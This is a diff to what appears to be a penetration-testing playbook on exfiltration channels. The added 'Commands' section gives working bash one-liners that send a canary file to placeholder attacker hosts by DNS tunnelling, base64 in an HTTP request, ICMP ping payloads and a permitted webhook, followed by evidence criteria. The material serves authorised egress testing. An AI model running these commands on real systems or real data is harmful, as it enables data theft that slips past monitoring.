@@ -65,6 +65,36 @@ various channels.
 - Test burst exfiltration (large volume, short window)
 - Evidence: threshold at which monitoring triggers (if ever)
 
+## Commands
+
+```bash
+# DNS exfiltration (bypasses egress filtering that only allows DNS)
+cat /tmp/canary.txt | xxd -p | tr -d '\n' | fold -w60 \
+  | while read c; do dig +short "$c.$RANDOM.OAST_DOMAIN" >/dev/null; done
+
+# HTTP(S) egress to an attacker-controlled sink (OAST), chunked + base64
+B=$(base64 -w0 /tmp/canary.txt)
+curl -s "https://OAST_DOMAIN/x?d=$B" -A "exfil-test"
+
+# ICMP channel when TCP/UDP egress is blocked
+ping -p "$(echo -n CANARY | xxd -p)" -c1 OAST_IP
+
+# Allowed-service abuse (data in a request to a permitted SaaS/webhook)
+curl -s -X POST https://ALLOWED_WEBHOOK -d "note=$B"
+```
+
+Every canary is a unique engagement token so a callback is unambiguously yours.
+
+## Validation Gate (minimum proof)
+
+- **Demonstrated:** a unique canary left the trust boundary and arrived at the
+  attacker-controlled sink, correlated by its token (OAST callback / received
+  request). Name the channel (DNS/HTTP/ICMP/allowed-service) and whether any
+  control (DLP, egress filter) fired.
+- **Inferred:** the channel appears open (e.g. outbound DNS resolves) but no
+  tagged canary was received end-to-end.
+- Record negative space: channels that were blocked are coverage, not failures.
+
 ## Gotchas
 
 - ALWAYS use synthetic test data, NEVER real PII/secrets
